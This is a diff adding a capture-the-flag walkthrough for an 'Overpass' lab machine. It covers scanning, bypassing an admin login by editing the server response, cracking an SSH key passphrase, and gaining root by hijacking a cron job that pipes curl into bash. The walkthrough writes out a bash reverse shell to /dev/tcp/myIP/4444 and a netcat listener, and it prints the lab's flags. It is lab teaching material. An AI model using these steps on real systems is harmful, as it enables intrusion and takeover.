@@ -1,0 +1,93 @@
+ip address:10.10.29.158
+
+Nmap:
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
+|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
+|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
+80/tcp open  http    syn-ack Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Overpass
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster: 
+
+on 80:
+/img (Status: 301)
+/downloads (Status: 301)
+/aboutus (Status: 301)
+/admin (Status: 301)
+/css (Status: 301)
+
+go to /admin turn on burp and intercept the login request
+
+in the response of the request change the invalid credentials to test test and then reload the page
+we are logged in and we have the following message: 
+
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+
+- grab the ssh key and save it to a file
+- ssh2john id_rsa > ssh.hash
+crack the hash:
+john ssh.hash --wordlist rockyou.txt
+
+james13          (id_rsa1)
+
+change the permission of id_rsa1 in order to log in via ssh
+chmod 600 id_rsa1
+
+log in to ssh using james username: ssh -i id_rsa1 james@ip
+
+get user.txt: thm{65c1aaf000506e56996822c6281e6bf7}
+
+privilege escalation: cat /etc/crontab
+
+james@overpass-prod:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+
+
+
+there is a crontab that runs every minute as root and it curls overpass.thm/downloads/src/buildscript.sh | bash
+
+we can exploit this by changing the host of overpass.thm to our machine. In order to do this, we can edit then /etc/hosts and set our ip adress to the overpass.thm
+
+the next step is to create a buildscript.sh on our machine and create an route of /downloads/script .
+ buildscript.sh must contain the following:
+#!/bin/bash
+bash -c "bash -i >& /dev/tcp/myIP/4444 0>&1"
+
+save the file and host it using udo python -m SimpleHTTPServer 80
+
+open a new terminal on your machine and set up a netcat listener on port 4444:
+nc -lvnp 4444
+
+after the crontab is run, it will copy the buildscript.sh from out machine and start a reverse shell that is captured using netcat.
+
+after you get root privileges, you can cat for /root/root.txt:
+thm{7f336f8c359dbac18d54fdd64ea753bb}
